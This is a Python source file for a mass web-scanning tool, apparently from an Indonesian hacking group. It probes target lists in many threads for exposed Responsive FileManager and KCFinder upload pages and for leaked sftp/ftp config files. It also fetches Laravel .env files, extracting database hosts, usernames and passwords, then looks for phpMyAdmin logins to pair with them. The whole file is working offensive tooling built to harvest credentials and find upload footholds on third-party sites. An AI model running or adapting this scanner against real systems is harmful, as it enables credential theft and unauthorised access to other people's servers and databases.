#MINIMAL KALAU NOOB GA USAH RECODE HAPUS NAMA AUTHOR YA BANGSAT
#GITHUB : https://github.com/kirazetsu
try:
	import requests as r, os, sys, re, rich
	import random, string
	from time import sleep
	from bs4 import BeautifulSoup as par
	from concurrent.futures import ThreadPoolExecutor as pol
except:
	exit("ketik: python -m pip install requests bs4 rich\n")

clear = lambda: os.system("clear") if "linux" in sys.platform.lower() else os.system("cls")
header = lambda: {"user-agent": "chrome", "User-Agent": "chrome"}

def writer(name, content):
	try:
		if content.strip() in open(name, "r").read():
			pass
		else:
			open(name, "a+").write(content.strip().replace("\n","")+"\n")
	except FileNotFoundError:
		open(name, "a+").write(content.strip().replace("\n","")+"\n")

def SingleTarget():
	tnya = input("> Ingin massal/single? [M/S]: ")
	while tnya not in list("MmSs"):
		print("*> Pilihan tidak tersedia..")
		tnya = input("> Ingin massal/single? [M/S]: ")
	if tnya in list("Mm"):
		while True:
			file = input("> Masukan file: ")
			try:
				cek = open(file,"r").read().strip().split("\n")
				break
			except:
				print("*> File tidak ditemukan")
		return cek
	else:
		trget = input("> Target site/hostname: ")
		while trget == "":
			trget = input("> Target site/hostname: ")
		return trget.split()

def SinglePath():
	tnya = input("> insert Path, Manual/Auto? [M/A]: ")
	while tnya not in list("MmAa"):
		print("*> Pilihan tidak tersedia..")
		tnya = input("> insert Path, Manual/Auto? [M/A]: ")
	if tnya in list("Mm"):
		while True:
			file = input("> Path File: ")
			try:
				cek = open(file,"r").read().strip().split("\n")
				break
			except:
				print("*> File tidak ditemukan")
		return cek
	else:
		return "auto"

def rfm_check(url, dir):
	global header
	url = ["http://"+e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", url)][0]
	for x in dir:
		try:
			xpl = url + "/" + x
			cek = r.get(xpl, headers=header(), allow_redirects=True, timeout=10).text
			if "Responsive FileManager" in str(cek) or "chmod_files_allowed" in str(cek) or "lang_filename" in str(cek):
				writer("result/rfm.txt", xpl)
				rich.print("[bold green]   RFM > "+str(xpl)+"[/]")
				break
			else:
				rich.print("[bold red]   RFM > "+str(xpl)+"[/]")
		except:
			rich.print("[bold red]   invalid > "+str(xpl)+"[/]")

def kcfinder(url, dir):
	global header
	url = ["http://"+e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", url)][0]
	for x in dir:
		xpl = url + "/" + x
		try:
			cek = r.get(xpl, headers=header(), timeout=10).text
			if "Resources Browser" in str(cek) or "frmUploadWorker" in str(cek) or "frmActualFolder" in str(cek) or "alert('Unknown error')" in str(cek):
				writer("result/ckeditor.txt", xpl)
				rich.print("[bold green]   valid > "+str(xpl)+"[/]")
				break
			else:
				rich.print("[bold red]   invalid > "+str(xpl)+"[/]")
		except:
			rich.print("[bold red]   invalid > "+str(xpl)+"[/]")

def sftp(url, dir):
	global header
	url = ["http://"+e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", url)][0]
	for x in dir:
		xpl = url + "/" + x
		try:
			cek = r.get(xpl, headers=header(), timeout=10, allow_redirects=True).json()
			if len(cek["host"]) != 0 and len(cek["password"]) != 0:
				writer("result/ftpjson.txt", xpl)
				rich.print("[bold green]   valid > "+str(xpl)+"[/]")
				break
			else:
				rich.print("[bold red]   invalid > "+str(xpl)+"[/]")
		except:
			rich.print("[bold red]   invalid > "+str(xpl)+"[/]")

def pma_scan(url, teks):
	global header
	dir = ['/phpMyAdmin/', '/phpmyadmin/', '/PMA/', '/admin/', '/dbadmin/', '/mysql/', '/myadmin/', '/phpmyadmin2/', '/phpMyAdmin2/', '/phpMyAdmin-2/', '/php-my-admin/', '/phpMyAdmin-2.2.3/', '/phpMyAdmin-2.2.6/', '/phpMyAdmin-2.5.1/', '/phpMyAdmin-2.5.4/', '/phpMyAdmin-2.5.5-rc1/', '/phpMyAdmin-2.5.5-rc2/', '/phpMyAdmin-2.5.5/', '/phpMyAdmin-2.5.5-pl1/', '/phpMyAdmin-2.5.6-rc1/', '/phpMyAdmin-2.5.6-rc2/', '/phpMyAdmin-2.5.6/', '/phpMyAdmin-2.5.7/', '/phpMyAdmin-2.5.7-pl1/', '/phpMyAdmin-2.6.0-alpha/', '/phpMyAdmin-2.6.0-alpha2/', '/phpMyAdmin-2.6.0-beta1/', '/phpMyAdmin-2.6.0-beta2/', '/phpMyAdmin-2.6.0-rc1/', '/phpMyAdmin-2.6.0-rc2/', '/phpMyAdmin-2.6.0-rc3/', '/phpMyAdmin-2.6.0/', '/phpMyAdmin-2.6.0-pl1/', '/phpMyAdmin-2.6.0-pl2/', '/phpMyAdmin-2.6.0-pl3/', '/phpMyAdmin-2.6.1-rc1/', '/phpMyAdmin-2.6.1-rc2/', '/phpMyAdmin-2.6.1/', '/phpMyAdmin-2.6.1-pl1/', '/phpMyAdmin-2.6.1-pl2/', '/phpMyAdmin-2.6.1-pl3/', '/phpMyAdmin-2.6.2-rc1/', '/phpMyAdmin-2.6.2-beta1/', '/phpMyAdmin-2.6.2-rc1/', '/phpMyAdmin-2.6.2/', '/phpMyAdmin-2.6.2-pl1/', '/phpMyAdmin-2.6.3/', '/phpMyAdmin-2.6.3-rc1/', '/phpMyAdmin-2.6.3/', '/phpMyAdmin-2.6.3-pl1/', '/phpMyAdmin-2.6.4-rc1/', '/phpMyAdmin-2.6.4-pl1/', '/phpMyAdmin-2.6.4-pl2/', '/phpMyAdmin-2.6.4-pl3/', '/phpMyAdmin-2.6.4-pl4/', '/phpMyAdmin-2.6.4/', '/phpMyAdmin-2.7.0-beta1/', '/phpMyAdmin-2.7.0-rc1/', '/phpMyAdmin-2.7.0-pl1/', '/phpMyAdmin-2.7.0-pl2/', '/phpMyAdmin-2.7.0/', '/phpMyAdmin-2.8.0-beta1/', '/phpMyAdmin-2.8.0-rc1/', '/phpMyAdmin-2.8.0-rc2/', '/phpMyAdmin-2.8.0/', '/phpMyAdmin-2.8.0.1/', '/phpMyAdmin-2.8.0.2/', '/phpMyAdmin-2.8.0.3/', '/phpMyAdmin-2.8.0.4/', '/phpMyAdmin-2.8.1-rc1/', '/phpMyAdmin-2.8.1/', '/phpMyAdmin-2.8.2/', '/sqlmanager/', '/mysqlmanager/', '/p/m/a/', '/PMA2005/', '/pma2005/', '/phpmanager/', '/php-myadmin/', '/phpmy-admin/', '/webadmin/', '/sqlweb/', '/websql/', '/webdb/', '/mysqladmin/', '/mysql-admin/']
	for x in dir:
		xpl = url + x
		try:
			cek = r.get(xpl, headers=header(), timeout=10, allow_redirects=True).text
			if "phpMyAdmin" in str(cek) and "pma_username" in str(cek):
				teks += "   phpMyAdmin: %s\n" % (xpl)
				with open("result/laravel_env.txt", "a+") as wr:
					wr.write(teks)
				break
			else:
				pass
		except:
			pass
	return teks

def scan_env(url, dir):
	global header
	url = ["http://"+e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", url)][0]
	skck = "+> Site: "+url+"\n"
	found = []
	for x in dir:
		xpl = url + "/" + x
		try:
			cek = r.get(xpl, headers=header(), timeout=10, allow_redirects=True)
			if cek.status_code == 200:
				cek = cek.text
				if "DB_CONNECTION" in cek and "DB_HOST" in cek and "DB_PORT" in cek:
					type = "".join(re.findall("DB_CONNECTION=(.*?)\n", str(cek)))
					host = "".join(re.findall("DB_HOST=(.*?)\n", str(cek)))
					port = "".join(re.findall("DB_PORT=(.*?)\n", str(cek)))
					database = "".join(re.findall("DB_DATABASE=(.*?)\n", str(cek)))
					username = "".join(re.findall("DB_USERNAME=(.*?)\n", str(cek)))
					password = "".join(re.findall("DB_PASSWORD=(.*?)\n", str(cek)))
					skck += "   Connection: %s : %s\n" % (type, port)
					skck += "   Host: %s\n" % (host)
					skck += "   User: %s\n" % (username)
					skck += "   Pass: %s\n" % (password)
					skck += "   Database: %s\n" % (database)
					found.append(url)
					break
				else:
					pass
			else:
				pass
		except:
			pass
	if len(found) != 0:
		add = pma_scan(url, skck)
		rich.print("\r[bold green]"+add+"[/]")
	else:
		rich.print("[bold red]+> invalid > "+str(url)+"[/]")



def main():
	rich.print("""
[green]  _________
 /   _____/ ____ _____    ____   ____   ___________
 \_____  \_/ ___\\\__  \  /    \ /    \_/ __ \_  __ \\
 /        \  \___ / __ \|   |  \   |  \  ___/|  | \/
/_______  /\___  >____  /___|  /___|  /\___  >__|AUTHOR :  Kirazetsu | IronHeart_X12
        \/     \/     \/     \/     \/     \/[/]TEAM : Clan_X12 | Vernest Team


    01) Responsive Filemanager Scanner
    02) CKeditor/KCFinder Scanner
    03) Sftp/Ftp scanner
    04) Laravel env scanner
    00) Exit program
	""")
	# SinglePath()
	pilih = input("> choose: ")
	while pilih == "" or not pilih.isdigit():
		pilih = input("> choose: ")
	if pilih in ["01","1"]:
		target = SingleTarget()
		paths = SinglePath()
		if paths == "auto":
			DIR = ['/assets/filemanager/', '/assets/file-manager/',
				'/assets/filemanagers/', '/assets/filemanager/dialog.php',
				'/asset/filemanager/dialog.php', '/asset/filemanager/',
				'/asset/file-manager/', '/asset/filemanagers/',
				'/filemanager/', '/filemanager/dialog.php'
				'/assets/admin/js/filemanager/', '/admin/assets/filemanager/',
				'/dashboard/assets/filemanager/', '/media/filemanager/dialog.php',
				'/assets/plugins/filemanager/dialog.php',
				'/assets/admin/js/tinymce/plugins/filemanager/dialog.php',
				'/plugins/filemanager/dialog.php',
				'/plugins/filemanager/', '/filemanager/',
				'/contents/filemanager/dialog.php',
				'/templates/filemanager/dialog.php',
				'/file-manager/dialog.php', '/fileman/dialog.php',
				'/vendor/filemanager/dialog.php', '/api/vendor/filemanager/',
				'/api/vendor/filemanager/dialog.php'
			]
		else:
			DIR = paths
		print("")
		with pol(max_workers=10) as sub:
			for x in target:
				sub.submit(rfm_check, x, DIR)
		exit("\n> Prosess selesai.. result disimpan kedalam result/rfm.txt\n")
	elif pilih in ["02", "2"]:
		target = SingleTarget()
		paths = SinglePath()
		if paths == "auto":
			DIR = ["/ckeditor/kcfinder/upload.php","/kcfinder/upload.php","/assets/kcfinder/upload.php","/webboard/plugins/editors/kcfinder/upload.php","/admin/editor/kcfinder/upload.php","/ckeditor/plugins/kcfinder/upload.php","/admin-panel/vendor/kcfinder/upload.php","/assets/plugin/kcfinder/upload.php","/plugins/kcfinder/upload.php","/admin/kcfinder/upload.php","/vendor/kcfinder/upload.php","/painel/kcfinder/upload.php","/panel/kcfinder/upload.php","/yonetim/engine/ckeditor/kcfinder/upload.php","/assets/admin/js/kcfinder/upload.php","/js/kcfinder/upload.php","/upload/kcfinder/upload.php","/site/plugins/kcfinder/upload.php","/assets/js/kcfinder/upload.php","/app/libraries/kcfinder/upload.php","/modules/kcfinder/upload.php","/lib/kcfinder/upload.php","/uploads/kcfinder/upload.php","/storage/app/kcfinder/upload.php","/inc/kcfinder/upload.php","/assets/ckeditor/kcfinder/upload.php","/resources/kcfinder/upload.php","/modules/admin/editor/kcfinder/upload.php","/system/kcfinder/upload.php","/assets/admin/plugins/kcfinder/upload.php","/en/kcfinder/upload.php","/plugin/ckeditor/kcfinder/upload.php","/data/kcfinder/upload.php","/core/kcfinder/upload.php","/files/kcfinder/upload.php","/admin/public/kcfinder/upload.php","/media/kcfinder/upload.php","/modules/ckeditor/kcfinder/upload.php","/plugin/kcfinder/upload.php","/system/libraries/kcfinder/upload.php","/foo/kcfinder/upload.php","/bar/kcfinder/upload.php","/test/kcfinder/upload.php","/tmp/kcfinder/upload.php","/secret/kcfinder/upload.php","/logs/kcfinder/upload.php","/config/kcfinder/upload.php","/private/kcfinder/upload.php","/data/uploads/kcfinder/upload.php","/images/kcfinder/upload.php","/uploads/cache/kcfinder/upload.php","/assets/css/kcfinder/upload.php","/upload/images/kcfinder/upload.php","/img/kcfinder/upload.php","/filemanager/kcfinder/upload.php","/storage/kcfinder/upload.php","/uploads/files/kcfinder/upload.php","/gallery/kcfinder/upload.php","/vendor/assets/kcfinder/upload.php","/uploads/images/kcfinder/upload.php","/files/docs/kcfinder/upload.php","/config/config.kcfinder/upload.php","/assets/kcfinder/src/","/data/files/kcfinder/upload.php","/includes/kcfinder/upload.php","/resources/views/kcfinder/upload.php","/upload/files/kcfinder/upload.php","/cache/kcfinder/upload.php","/uploads/uploadfiles/kcfinder/upload.php","/library/kcfinder/upload.php","/system/assets/kcfinder/upload.php","/js/ckeditor/kcfinder/upload.php","/data/upload/kcfinder/upload.php","/tmp/cache/kcfinder/upload.php","/lib/ckeditor/kcfinder/upload.php","/data/file/kcfinder/upload.php","/js/libs/kcfinder/upload.php","/files/data/kcfinder/upload.php","/css/kcfinder/upload.php","/plugins/ckeditor/kcfinder/upload.php","/upload/images/uploads/kcfinder/upload.php","/site/ckeditor/kcfinder/upload.php","/assets/css/admin/kcfinder/upload.php","/uploads/uploads/kcfinder/upload.php","/public/kcfinder/upload.php","/upload/uploads/kcfinder/upload.php","/cache/images/kcfinder/upload.php","/app/assets/kcfinder/upload.php","/assets/cms/kcfinder/upload.php","/uploads/uploads/uploads/kcfinder/upload.php","/css/admin/kcfinder/upload.php","/uploads/files/files/kcfinder/upload.php","/upload/images/images/kcfinder/upload.php","/uploads/data/kcfinder/upload.php","/uploads/images/upload/kcfinder/upload.php","/uploads/images/files/kcfinder/upload.php","/uploads/data/files/kcfinder/upload.php","/ckeditor/kcfinder/upload.phpkcfinder/upload.php","/assets/kcfinder/upload.phpckeditor/","/uploads/upload/kcfinder/upload.php","/fileuploads/kcfinder/upload.php","/uploads/images/images/uploads/kcfinder/upload.php","/uploads/upload/upload/kcfinder/upload.php","/uploads/files/uploads/kcfinder/upload.php","/assets/ckeditor/plugins/kcfinder/upload.php","/uploads/images/upload/images/kcfinder/upload.php","/uploads/images/files/uploads/kcfinder/upload.php","/uploads/images/uploadfiles/kcfinder/upload.php","/uploads/files/upload/images/kcfinder/upload.php","/uploads/images/files/upload/kcfinder/upload.php"]
		else:
			DIR = paths
		print("")
		with pol(max_workers=10) as sub:
			for x in target:
				sub.submit(kcfinder, x, DIR)
		exit("\n> Prosess selesai.. result disimpan kedalam result/ckeditor.txt\n")
	elif pilih in ["03","3"]:
		target = SingleTarget()
		paths = SinglePath()
		if paths == "auto":
			DIR = [
				"/sftp-config.json",
				"/ftp-config.json",
				"/config.json",
				"/.vscode/sftp.json",
				"/sftp.json",
				"/.vscode/ftp.json",
				"/ftp.json",
				"/.vscode/ftp-config.json",
				"/.vscode/sftp-config.json"
			]
		else:
			DIR = paths
		print("")
		with pol(max_workers=10) as sub:
			for x in target:
				sub.submit(sftp, x, DIR)
		exit("\n> Prosess selesai.. result disimpan kedalam result/ftpjson.txt\n")
	elif pilih in ["04","4"]:
		target = SingleTarget()
		DIR = ['.env', '../.env', '../../.env', '../../../.env', 'vendor/.env ', 'lib/.env ', 'lab/.env  ', 'cronlab/.env', 'cron/.env', 'core/.env', 'core/app/.env', 'core/Database/.env ', 'database/.env ', 'system/.env', 'config/.env ', 'assets/.env ', 'fileweb/.env', 'l53/.env', 'club/.env', 'app/.env ', 'apps/.env', 'uploads/.env ', 'sitemaps/.env ', 'site/.env ', 'admin/.env ', 'web/.env ', 'public/.env ', 'resources/.env', 'sistema/.env', 'en/.env ', 'tools/.env', 'clientes/.env', 'clientes/laravel_inbox/.env', 'clientes/laravel/.env', 'v1/.env ', 'administrator/.env ', 'laravel/.env']
		print("")
		with pol(max_workers=20) as sub:
			for x in target:
				sub.submit(scan_env, x, DIR)
		exit("\n> Prosess selesai.. result disimpan kedalam result/laravel_env.txt\n")
	elif pilih in ["00","0"]:
		exit("* Good Bye..\n")
	else:
		exit("* Fitur tidak tersedia\n")

if __name__=="__main__":
	try: os.mkdir("result")
	except: pass
	clear()
	main()
